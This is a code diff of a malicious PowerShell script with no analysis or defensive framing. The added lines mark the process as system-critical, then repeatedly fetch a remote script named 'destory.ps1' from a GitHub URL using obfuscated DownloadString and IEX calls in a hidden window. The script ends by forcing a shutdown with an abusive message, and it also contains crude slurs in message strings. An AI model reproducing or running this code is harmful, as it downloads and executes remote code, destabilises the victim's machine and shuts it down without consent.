@@ -8,10 +8,17 @@ public class CriticalProcess
     public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
 }
 "@
+[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-Add-Type -TypeDefinition $code
-[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
-[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
-[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", " Fuck ", "OK", "Warning")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+shutdown /s /t 15 /c "Fuck you :)"
